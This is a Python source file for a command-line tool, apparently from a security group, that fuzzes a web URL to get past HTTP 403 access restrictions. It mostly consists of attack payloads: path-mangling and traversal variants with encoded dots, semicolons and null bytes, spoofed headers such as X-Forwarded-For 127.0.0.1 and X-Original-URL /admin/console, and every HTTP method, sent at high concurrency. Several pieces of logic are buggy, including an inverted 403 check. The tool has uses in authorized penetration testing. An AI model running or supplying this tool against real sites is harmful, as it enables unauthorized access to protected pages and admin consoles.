# coding:utf-8
from urllib.parse import urlparse
from commonutils.color import *
from getuseragent import UserAgent
import requests
import asyncio,aiohttp
import time
import sys,getopt
from aiohttp import TCPConnector

outputfileName = "./result/bypass403.txt"

def banner():
    result = '''
 ________      ___    ___ ________  ________  ________   ________  ___   ___  ________  ________     
|\   __  \    |\  \  /  /|\   __  \|\   __  \|\   ____\ |\   ____\|\  \ |\  \|\   __  \|\_____  \    
\ \  \|\ /_   \ \  \/  / | \  \|\  \ \  \|\  \ \  \___|_\ \  \___|\ \  \\_\  \ \  \|\  \|____|\ /_   
 \ \   __  \   \ \    / / \ \   ____\ \   __  \ \_____  \\ \_____  \ \______  \ \  \\\  \    \|\  \  
  \ \  \|\  \   \/  /  /   \ \  \___|\ \  \ \  \|____|\  \\|____|\  \|_____|\  \ \  \\\  \  __\_\  \ 
   \ \_______\__/  / /      \ \__\    \ \__\ \__\____\_\  \ ____\_\  \     \ \__\ \_______\|\_______\ 
    \|_______|\___/ /        \|__|     \|__|\|__|\_________\\_________\     \|__|\|_______|\|_______|
             \|___|/                            \|_________\|_________|                                 
        '''
    greenprint(result)
    greenprint('coding: 3stoneBrther')
    greenprint('Github: https://github.com/NumencyberLabs')
    greenprint('twitter: @numencyber')


tasks = []

def parseURL(url):
    result = {}
    o = urlparse(url)
    result['path'] = o.path
    result['hostname'] = o.hostname
    result['scheme'] = o.scheme
    return result

def generatePathFuzz(path):
    prepath = path.strip('/')
    rstList = []
    rstList.append('/' + prepath.upper())

    otherPathDict = ['secret/', 'secret/.', '/secret//', './secret/..',';/secret', '.;/secret','/;//secret',
                     'secret.json', '%2e/secret', '%252e/secret', '%ef%bc%8fsecret','secret?','secret??',
                     './secret/./','secret..\;/','secret/.randomstring','.\;/secret','secret/*','secret/./',
                     '%2F/secret/','secret/.','secret/%20','secret/%09','secret.html','secret/?anything','secret#',
                     'secret;/','secret..;/','secret','secret',"secret&","secret%","secret%09","secret../","secret..%2f",
                     "secret.././","secret..%00/","secret..%0d/","secret..%5c","secret..\\","secret..%ff","secret%2e%2e%2f",
                     "secret.%2e/","secret%3f","secret%26","secret%23","secret%2e","secret/.","secret?","secret??","secret???",
                     "secret//","secret/./","secret.//./","secret//?anything","secret#","secret/","secret/.randomstring","secret..;/",
                     "secret.html","secret%20/","secret.json","secret\..\.\\","secret/*","secret./.","secret/*/","secret/..;/","secret/%2e/",
                     "secret//.","secret////","secret/../","secret/???",'%20secret%20/',"secret//","./secret/./"
                      ]
    [rstList.append('/'+item.replace('secret',prepath)) for item in otherPathDict]
    return rstList

def generateUnicodeFuzz(path):
    path = path.strip('/')
    unicodeDict = []
    with open('./data/Unicode.txt','r') as f:
        for item in f.readlines():
            item = item.strip('\n')
            unicodeDict.append('/' +path + item)
            unicodeDict.append('/' + path + '/' + item)
            unicodeDict.append('/' + item + '/' + path)
    return unicodeDict

def smallFuzz(url):
    useragent = UserAgent()
    theuseragent = useragent.Random()
    headers = {'user-agent': theuseragent}
    r = requests.get(url,headers=headers)
    if r.status_code == 200:
        redprint("[+] The GET Method Bypass 403. " + url)

    r = requests.post(url, headers=headers)
    if r.status_code == 200:
        redprint("[+] The POST Method Bypass 403. " + url)

    r = requests.head(url, headers=headers)
    if r.status_code == 200:
        redprint("[+] The HEAD Method Bypass 403. " + url)

    r = requests.put(url, headers=headers)
    if r.status_code == 200:
        redprint("[+] The PUT Method Bypass 403. " + url)

    r = requests.delete(url, headers=headers)
    if r.status_code == 200:
        redprint("[+] The DELETE Method Bypass 403. " + url)

    r = requests.options(url, headers=headers)
    if r.status_code == 200:
        redprint("[+] The OPTIONS Method Bypass 403. " + url)

    r = requests.patch(url, headers=headers)
    if r.status_code == 200:
        redprint("[+] The PATCH Method Bypass 403. " + url)


def FuzzTarges(url,isBig):
    parsedRst = parseURL(url)
    result = []
    path = parsedRst['path']
    httpurl = parsedRst['scheme'] + '://' + parsedRst['hostname']
    xforwaydHeaders =  [{'X-Originating-IP':'127.0.0.1'},{'X-Forwarded-For':'127.0.0.1'},{'X-Forwarded':'127.0.0.1'},{'Forwarded-For':'127.0.0.1'},
            {'X-Remote-IP':'127.0.0.1'},{'X-Remote-Addr':'127.0.0.1'},{'X-ProxyUser-Ip':'127.0.0.1'},{'X-Original-URL':'127.0.0.1'},
            {'Client-IP':'127.0.0.1'},{'True-Client-IP': '127.0.0.1'}, {'Cluster-Client-IP': '127.0.0.1'},
            {'X-Original-URL ':'/admin/console'}, {'X-Rewrite-URL':'/admin/console'},{'Host':'google.com'},{'X-Custom-IP-Authorization':'127.0.0.1'},
            {'X-Custom-IP-Authorization': '127.0.0.1'},{'X-Original-URL':path},{'X-Rewrite-URL':path},{'X-Host':'127.0.0.1'},{'X-Originating-IP': '127.0.0.1'},
            {'Client-IP': '127.0.0.1'},{'X-Forwarded-Host': '127.0.0.1'},{'X-Originally-Forwarded-For': '127.0.0.1, 68.180.194.242'},
            {'X-Originating-IP': '127.0.0.1, 68.180.194.242'},{'True-Client-IP': '127.0.0.1, 68.180.194.242'},{"X-WAP-Profile":"127.0.0.1, 68.180.194.242" },
            {"X-WAP-Profile": "127.0.0.1, 68.180.194.242"},{"Profile":httpurl},{"X-Arbitrary":httpurl},{"X-HTTP-DestinationURL":httpurl},{"X-Forwarded-Proto":httpurl},
            {"Destination": "127.0.0.1, 68.180.194.242"},{"Proxy": "127.0.0.1, 68.180.194.242"},{"Forwarded":"127.0.0.1, 68.180.194.242"},{"X-Forwarded-Port": "443"},
            {"X-Forwarded-Port": "4443"},{"X-Forwarded-Port": "80"},{"X-Forwarded-Port": "8080"},{"X-Forwarded-Port": "8443"},{'Referer':path} ]
    for uaforward in xforwaydHeaders:
        item = {}
        headers = {}
        useragent = UserAgent()
        theuseragent = useragent.Random()
        headers.update({'user-agent': theuseragent})
        headers.update(uaforward)
        item.update({'url':url})
        item.update({'headers':headers})
        result.append(item)


    pathes = generatePathFuzz(path)
    for path1 in pathes:
        item = {}
        headers = {}
        useragent = UserAgent()
        theuseragent = useragent.Random()
        headers.update({'user-agent': theuseragent})
        item.update({'headers':headers})
        url = parsedRst['scheme'] + '://' +  parsedRst['hostname'] + path1
        item.update({'url':url})
        result.append(item)

    ## fuzz dir
    with open('./data/dir-list.txt','r') as f:
        for pathdir in f.readlines():
            pathdir = pathdir.strip().replace('\n', '').replace('\r', '')
            if not pathdir.startswith(('http://', 'https://')):
                break

            item = {}
            url = parsedRst['scheme'] + '://' + parsedRst['hostname'] + '/' + path +'/' + pathdir
            useragent = UserAgent()
            theuseragent = useragent.Random()
            headers = {}

            headers.update({'user-agent': theuseragent})
            item.update({'headers': headers})
            item.update({'url': url})
            result.append(item)


    if isBig:
        useragent = UserAgent()
        theuseragent = useragent.Random()
        for path1 in generateUnicodeFuzz(path):
            item = {}
            headers = {}

            headers.update({'user-agent': theuseragent})
            item.update({'headers': headers})
            url = parsedRst['scheme'] + '://' + parsedRst['hostname'] + path1
            item.update({'url': url})
            result.append(item)

    return result

async def fuzz403(target,semaphore):
    async with semaphore:
        url = target['url']
        headers = target['headers']
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
            try:
                async with session.get(url,headers = headers,timeout=3) as response:
                    status_code =  response.status
                    if status_code == 200 or status_code == 302 :
                        greenprint("[+] This URL path Bypass 403. " + url)
                        return (url,headers)
            except Exception as e:
                return None


def run(loop,url,isBig):
    smallFuzz(url)
    targets = FuzzTarges(url,isBig)
    semaphore = asyncio.Semaphore(500)  # 限制并发量为500

    for item in targets:
        task = asyncio.ensure_future(fuzz403(item,semaphore))
        tasks.append(task)
    results = loop.run_until_complete(asyncio.gather(*tasks))

    with open(outputfileName, "w") as f:
        for rst in results:
            if rst != None:
                f.write(rst[0] + ',' + str(rst[1]) + '\n')



def fuzzOneurl(url,isBig):
    try:
        r = requests.get(url)
        if r.status_code == 403:
            yellowprint("[+] The Requets URL status_code is not 403. " + url)
        else:
            yellowprint("\n[+] -------- fuzzing bypass " + url + " is begining --------")
            loop = asyncio.get_event_loop()
            run(loop, url, isBig)
    except Exception as e:
        print(str(e))

def fuzzOneAPI(url):
    pass


def parse_arguments(argv):
    url = ""
    filename = ""
    isBig = False

    try:
        opts, args = getopt.getopt(argv, "hu:l:r:b:o:", ["help", "url=", "filename=","burpfile=","isBig=","outputfile="])
    except getopt.GetoptError:
        redprint('Error: bypass403.py -u <url> or: bypass403.py -l <filename> or: bypass403.py -r <burpfilename>')
        sys.exit(2)

    if len(argv) < 1:
        redprint('Error: bypass403.py -u <url> or: bypass403.py -l <filename> or: bypass403.py -r <burpfilename>')
        sys.exit(2)

    for opt, arg in opts:
        if opt in ("-h", "--help"):
            banner()
            greenprint("isBig param -b True or False, the default param is Farse")
            greenprint('bypass403.py -u <url>')
            greenprint("bypass403.py -l <filename> ")
            greenprint("bypass403.py -r <burpfilename>")

            sys.exit()

        elif opt in ("-u", "--url"):
            url = arg
        elif opt in ("-l", "--filename"):
            filename = arg
        elif opt in ("-b", "--isBig"):
            if arg in ('True','False'):
                isBig = arg
        elif opt in ("-o","--outputfile"):
            global outputfileName
            outputfileName = arg


    if url:
        fuzzOneurl(url,isBig)

    if filename:
        with open(filename,'r') as f:
            for item in f.readlines():
                item.strip('\n')
                fuzzOneurl(item,isBig)

if __name__ == "__main__":
    banner()
    parse_arguments(sys.argv[1:])



